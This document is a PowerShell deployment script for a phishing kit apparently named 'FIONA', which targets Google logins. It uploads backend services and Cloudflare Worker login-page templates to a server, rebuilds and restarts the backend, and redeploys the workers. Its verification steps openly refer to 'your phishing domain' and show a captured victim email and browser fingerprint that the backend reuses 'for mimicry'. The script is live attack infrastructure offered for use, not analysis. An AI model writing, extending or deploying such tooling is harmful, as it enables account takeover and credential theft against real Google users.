# Complete Deployment Script - Upload Files + Redeploy Workers
# Run from Windows PowerShell

param(
    [Parameter(Mandatory=$true)]
    [string]$ServerIP,
    
    [string]$ServerUser = "root",
    [string]$ServerPath = "/var/www/fiona"
)

$ErrorActionPreference = "Stop"

Write-Host "=============================================="
Write-Host "FIONA - Complete Fingerprint Deployment"
Write-Host "=============================================="
Write-Host ""

$LocalPath = "C:\Users\happy\OneDrive\Desktop\prxyauth-desktop-1.2.4"

# Step 1: Upload all updated files
Write-Host "STEP 1: Uploading updated files to server..."
Write-Host "--------------------------------------------"

$filesToUpload = @(
    @{
        Local = "$LocalPath\backend\src\services\browser\google-auth-http.service.ts"
        Remote = "$ServerPath/backend/src/services/browser/google-auth-http.service.ts"
        Name = "google-auth-http.service.ts"
    },
    @{
        Local = "$LocalPath\backend\src\services\browser\browser-launch.config.ts"
        Remote = "$ServerPath/backend/src/services/browser/browser-launch.config.ts"
        Name = "browser-launch.config.ts"
    },
    @{
        Local = "$LocalPath\backend\src\routes\public\session.routes.ts"
        Remote = "$ServerPath/backend/src/routes/public/session.routes.ts"
        Name = "session.routes.ts"
    },
    @{
        Local = "$LocalPath\backend\login-pages\google\worker.js"
        Remote = "$ServerPath/backend/login-pages/google/worker.js"
        Name = "worker.js (CLOUDFLARE TEMPLATE)"
    }
)

foreach ($file in $filesToUpload) {
    Write-Host "  Uploading: $($file.Name)..." -NoNewline
    scp $file.Local "${ServerUser}@${ServerIP}:$($file.Remote)" 2>&1 | Out-Null
    if ($LASTEXITCODE -eq 0) {
        Write-Host " ✅" -ForegroundColor Green
    } else {
        Write-Host " ❌ FAILED!" -ForegroundColor Red
        exit 1
    }
}
Write-Host ""

# Step 2: Build backend
Write-Host "STEP 2: Building backend on server..."
Write-Host "--------------------------------------------"

ssh "${ServerUser}@${ServerIP}" "cd $ServerPath/backend && npm run build" 2>&1 | Out-String | Write-Host

if ($LASTEXITCODE -ne 0) {
    Write-Host "❌ Build failed! Fix errors above." -ForegroundColor Red
    exit 1
}
Write-Host "✅ Backend built successfully" -ForegroundColor Green
Write-Host ""

# Step 3: Restart backend
Write-Host "STEP 3: Restarting backend..."
Write-Host "--------------------------------------------"

ssh "${ServerUser}@${ServerIP}" "pm2 restart fiona-backend" 2>&1 | Out-Null
if ($LASTEXITCODE -eq 0) {
    Write-Host "✅ Backend restarted" -ForegroundColor Green
} else {
    Write-Host "⚠️  Restart failed" -ForegroundColor Yellow
}
Write-Host ""

# Step 4: Upload deployment script
Write-Host "STEP 4: Uploading worker redeployment script..."
Write-Host "--------------------------------------------"

scp "$LocalPath\REDEPLOY-ALL-WORKERS.sh" "${ServerUser}@${ServerIP}:/root/REDEPLOY-ALL-WORKERS.sh" 2>&1 | Out-Null
ssh "${ServerUser}@${ServerIP}" "chmod +x /root/REDEPLOY-ALL-WORKERS.sh"
Write-Host "✅ Script uploaded" -ForegroundColor Green
Write-Host ""

# Step 5: Redeploy all Cloudflare Workers
Write-Host "STEP 5: Redeploying ALL Cloudflare Workers..."
Write-Host "=============================================="

ssh "${ServerUser}@${ServerIP}" "bash /root/REDEPLOY-ALL-WORKERS.sh"

Write-Host ""
Write-Host "=============================================="
Write-Host "✅ DEPLOYMENT COMPLETE!"
Write-Host "=============================================="
Write-Host ""
Write-Host "NEXT STEPS - VERIFICATION:"
Write-Host ""
Write-Host "1. Visit your phishing domain in a browser"
Write-Host "2. Open DevTools (F12) → Network tab"
Write-Host "3. Enter an email address"
Write-Host "4. Click 'Next' button"
Write-Host "5. Check the POST request to /api/google/session/start"
Write-Host "6. Request payload should include:"
Write-Host "   {" -ForegroundColor Cyan
Write-Host "     `"email`": `"victim@gmail.com`"," -ForegroundColor Cyan
Write-Host "     `"fingerprint`": {" -ForegroundColor Cyan
Write-Host "       `"userAgent`": `"Mozilla/5.0...`"," -ForegroundColor Cyan
Write-Host "       `"screenWidth`": 1920," -ForegroundColor Cyan
Write-Host "       `"timezone`": `"America/New_York`"," -ForegroundColor Cyan
Write-Host "       ..." -ForegroundColor Cyan
Write-Host "     }" -ForegroundColor Cyan
Write-Host "   }" -ForegroundColor Cyan
Write-Host ""
Write-Host "CHECK BACKEND LOGS:"
Write-Host "ssh ${ServerUser}@${ServerIP}" -ForegroundColor Yellow
Write-Host "pm2 logs fiona-backend --lines 50 | grep FINGERPRINT" -ForegroundColor Yellow
Write-Host ""
Write-Host "You should see logs like:"
Write-Host "[FINGERPRINT] Received victim browser fingerprint: Mozilla/5.0..." -ForegroundColor Green
Write-Host "[FINGERPRINT] Using victim's browser fingerprint for mimicry" -ForegroundColor Green
Write-Host "[FINGERPRINT] Platform: Win32, Screen: 1920x1080..." -ForegroundColor Green
Write-Host ""
